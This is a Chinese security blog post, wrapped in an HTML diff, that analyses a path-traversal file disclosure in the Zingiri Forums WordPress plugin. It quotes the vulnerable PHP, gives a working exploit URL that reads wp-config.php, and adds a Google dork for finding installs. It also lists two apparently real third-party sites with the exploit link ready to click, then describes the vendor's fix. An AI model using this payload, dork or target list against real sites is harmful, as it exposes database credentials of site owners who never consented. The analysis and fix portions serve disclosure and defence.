@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>WordPress Zingiri Forums arbitrary file disclosure | Blog of Secer</title>
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/css/style.css" />
+  <meta name="generator" content="Blog of Secer">
+
+  
+  
+  
+
+  
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body class="home-template">
+<div id="perspective" class="perspective effect-movedown">
+  <div class="container">
+    <!-- wrapper -->
+    <div class="wrapper">
+
+      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">Blog of Secer</h1>
+            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
+        </div>
+    </div>
+</header>
+
+      
+
+<main class="content" role="main">
+  <article class="post">
+    <span class="post-meta">
+      <time datetime="2013-01-24T18:24:49.000Z" itemprop="datePublished">
+          2013-01-25
+      </time>
+    
+    
+    | 
+    <a href='/tag/漏洞/'>漏洞</a>,
+    
+    <a href='/tag/Wordpress/'>Wordpress</a>
+    
+    
+</span>
+    <h1 class="post-title">WordPress Zingiri Forums arbitrary file disclosure</h1>
+    <section class="post-content">
+      <p><a href="http://ha.cker.in/tag/WordPress" target="_blank">WordPress</a> Forums插件’url’参数任意文件泄露<a href="http://ha.cker.in/tag/漏洞" target="_blank">漏洞</a>的利用</p>  <p>参考：</p>  <p>WordPress Zingiri Forums arbitrary file disclosure    <br><a href="http://ceriksen.com/2013/01/12/wordpress-zingiri-forums-arbitrary-file-disclosure/" target="_blank" rel="external">http://ceriksen.com/2013/01/12/wordpress-zingiri-forums-arbitrary-file-disclosure/</a></p>  <p>Secunia Advisory SA50833    <br><a href="http://secunia.com/advisories/50833/" target="_blank" rel="external">http://secunia.com/advisories/50833/</a></p>  <p>&#160;</p>  <p>Analysis of vulnerability </p>  <p>The Zingiri Web Forums for WordPress writes our a header for the forum in forum.php through adding an action to wp_head. </p>  <div>   <pre>44    add_action(‘wp_head’,’zing_forum_header’); </pre><br></div><br><br><br><br><br><div><br>  <pre>686    function zing_forum_header()<br>687    {<br>688        global $zing_forum_content;<br>689        global $zing_forum_menu;<br>690        $output=zing_forum_output(&quot;content&quot;);<br>691<br>692        zing_integrator_cut($output,’<span style="color: #0000ff">&lt;</span><span style="color: #800000">div</span> <span style="color: #ff0000">id</span>=<span style="color: #0000ff">&quot;footer&quot;</span><span style="color: #0000ff">&gt;</span>‘,’<span style="color: #0000ff">&lt;/</span><span style="color: #800000">div</span><span style="color: #0000ff">&gt;</span>‘); //remove footer<br>693        zing_integrator_cut($output,’<span style="color: #0000ff">&lt;</span><span style="color: #800000">span</span> <span style="color: #ff0000">class</span>=<span style="color: #0000ff">&quot;forgot_password&quot;</span><span style="color: #0000ff">&gt;</span>‘,’<span style="color: #0000ff">&lt;/</span><span style="color: #800000">span</span><span style="color: #0000ff">&gt;</span>‘);<br>694<br>695        $zing_forum_content=$output;<br>696<br>697        echo ‘<span style="color: #0000ff">&lt;</span><span style="color: #800000">script</span> <span style="color: #ff0000">type</span>=<span style="color: #0000ff">&quot;text/javascript&quot;</span> <span style="color: #ff0000">language</span>=<span style="color: #0000ff">&quot;javascript&quot;</span><span style="color: #0000ff">&gt;</span>‘;<br>698        echo &quot;var zing_forum_url=’&quot;.ZING_FORUM_URL.&quot;ajax/‘;&quot;;<br>699        echo &quot;var zing_forum_index=’&quot;.get_option(‘home’).&quot;/index.php?’;&quot;;<br>700        echo &quot;function zing_forum_url_ajax(s) { return zing_forum_url+s; }&quot;;<br>701        echo ‘<span style="color: #0000ff">&lt;/</span><span style="color: #800000">script</span><span style="color: #0000ff">&gt;</span>‘;<br>702<br>703        echo ‘<span style="color: #0000ff">&lt;</span><span style="color: #800000">link</span> <span style="color: #ff0000">rel</span>=<span style="color: #0000ff">&quot;stylesheet&quot;</span> <span style="color: #ff0000">type</span>=<span style="color: #0000ff">&quot;text/css&quot;</span> <span style="color: #ff0000">href</span>=<span style="color: #0000ff">&quot;’ . ZING_FORUM_URL . ‘zing.css&quot;</span> <span style="color: #ff0000">media</span>=<span style="color: #0000ff">&quot;screen&quot;</span> <span style="color: #0000ff">/&gt;</span>‘;<br>704    } </pre><br></div><br><br><br><br><br><p>So on each load of the WordPress blog it will call into zing_forum_header. The first call it makes it into zing_forum_output, which is rather long. I’ve highlighted two areas: </p>
+
+<div><br>  <pre>456    function zing_forum_output($process) {<br>457        global $post,$wpdb,$zing_forum_loaded,$zing_forum_to_include,$zing_forum_mode;<br>458<br>459        $postVar=array();<br>460        switch ($process)<br>461        {<br>462            case &quot;content&quot;:<br>463        if (isset($post)) $cf=get_post_custom($post-&gt;ID);<br>464        if (isset($_GET[‘zforum’]))<br>465        {<br>466            $zing_forum_to_include=$_GET[‘zforum’];<br>467            $zing_forum_mode=&quot;forum&quot;;<br>468        } </pre><br></div>
+
+<p><br></p>
+<p>We can affect the value of $zing_forum_to_include through the zforum GET variable. This is then used in a big else if statement. Here is the block of code that is executed if we set that to css: </p>
+
+<div><br>  <pre>541    } elseif ($zing_forum_to_include==’css’) {<br>542            ob_end_clean();<br>543            if (isset($_GET[‘stylesheet’])) $key=$_GET[‘stylesheet’];<br>544            else $key=$_GET[‘url’];<br>545            if (isset($_SESSION[‘ccforum’][‘stylesheet’][$key])) {<br>546                $output=$_SESSION[‘ccforum’][‘stylesheet’][$key];<br>547            } else {<br>548                if (isset($_GET[‘stylesheet’])) {<br>549                    $http=zing_forum_http(&quot;mybb&quot;,’css.php’,&quot;&quot;);<br>550                    $news = new zHttpRequest($http,’zingiri-forum’);<br>551                    if (!$news-&gt;curlInstalled()) return &quot;cURL not installed&quot;;<br>552                    elseif (!$news-&gt;live()) return &quot;A HTTP Error occured&quot;;<br>553                    $output=$news-&gt;DownloadToString();<br>554                    $output=str_replace(‘url(images/‘,’url(‘.ZING_MYBB_URL.’/images/‘,$output);<br>555<br>556                } elseif ($_GET[‘url’]) {<br>557                    $url=$_GET[‘url’];<br>558                    $output=file_get_contents(ZING_MYBB_DIR.’/cache/themes/‘.$url);<br>559                }<br>560                $f[]=’/^body.<em>{(.</em>?)/‘;<br>561                $r[]=’ {$1’;<br>562                $f[]=’/.zingbody/‘;<br>563                $r[]=’’;<br>564                $f[]=’/(.<em>?).{(.</em>?)/‘;<br>565                $r[]=’.ccforum $1 {$2’;<br>566                $f[]=’/(.<em>?),(.</em>?).{(.<em>?)/‘;<br>567                $r[]=’$1,.ccforum $2 {$3’;<br>568                $f[]=’/(.</em>?),(.<em>?),(.</em>?).{(.*?)/‘;<br>569                $r[]=’$1,$2,.ccforum $3 {$4’;<br>570                $output=preg_replace($f,$r,$output,-1,$count);<br>571                if ($output) $_SESSION[‘ccforum’][‘stylesheet’][$key]=$output;<br>572            }<br>573            header(&quot;Content-type: text/css&quot;);<br>574            echo $output;<br>575            die();</pre><br></div>
+
+<p><br></p>
+<p>If we don’t set anything expect the “url” get variable, we can cause it to be fed into the file_get_contents call on line 554. We can abuse this to disclose the contents of the wp-config.php file like this: </p>
+
+<p>http://<font color="#000000">URL</font>/wordpress/?zforum=css&amp;url=../../../../../../wp-config.php</p>
+
+<p>&#160;</p>
+
+<p>谷歌：inurl:plugins/zingiri-forum<br>  <br></p>
+
+<p>躺枪列表:<br>  <br><a href="http://themakeupmorgue.com/?zforum=css&amp;url=../../../../../../wp-config.php" target="_blank" rel="external">http://themakeupmorgue.com/?zforum=css&amp;url=../../../../../../wp-config.php</a><br><br>  <br><a href="http://www.4newdesign.com/?zforum=css&amp;url=../../../../../../wp-config.php" target="_blank" rel="external">http://www.4newdesign.com/?zforum=css&amp;url=../../../../../../wp-config.php</a><br><br>  <br>&#160;&#160;&#160;&#160; </p>
+
+<p>修复手法：</p>
+
+<p>1.4.2版对比1.4.4版<br>  <br>557&#160;&#160;&#160; $url=$_GET[‘url’];<br><br>  <br>修改为<br><br>  <br>555&#160;&#160;&#160;&#160;&#160;&#160;&#160; $url=str_replace(‘..’,’’,$_GET[‘url’]); </p>
+
+<p>过滤了“..”，不让跳上层目录。</p>
+    </section>
+    <footer class="post-footer">
+      <section class="author">
+    <h4>Secer</h4>
+    <p>记录互联网安全历程与个人成长经历</p>
+</section>
+      <section class="share">
+    <h4>Share this post</h4>
+    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/971.seo/" target="_blank">
+        <span class="hidden">weibo</span>
+    </a>
+    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/971.seo/"
+       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <span class="hidden">Twitter</span>
+    </a>
+    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/971.seo/"
+       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <span class="hidden">Facebook</span>
+    </a>
+    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/971.seo/"
+       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+        <span class="hidden">Google+</span>
+    </a>
+</section>
+
+    </footer>
+  </article>
+  <nav class="pagination" role="pagination">
+    
+    <a class="newer-posts" href="/972.seo/">
+        ← 黑榜被日？简简单单日下黑客榜中榜
+    </a>
+    
+    <span class="icon-logo">•</span>
+    
+    <a class="older-posts" href="/970.seo/">
+        黑客组织Anonymous疯狂入侵中国站点思路分析 →
+    </a>
+    
+</nav>
+
+  <div id="comment" class="comments-area">
+    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
+    
+</div>
+
+</main>
+
+
+      
+<footer class="site-footer">
+  
+  <div class="inner">
+     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
+  </div>
+</footer>
+
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+<script type="text/javascript" src="/js/menu.js"></script>
+
+
+
+
+
+  </div>
+</div>
+
+<nav  class="outer-nav top horizontal">
+
+          <a class="icon-home"  href="/"><span>Home</span></a>
+
+          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+
+          <a class="icon-image"  href="/images"><span>Images</span></a>
+
+          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+
+          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
+
+          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+
+</nav>
+
+</div>
+</body>
+</html>
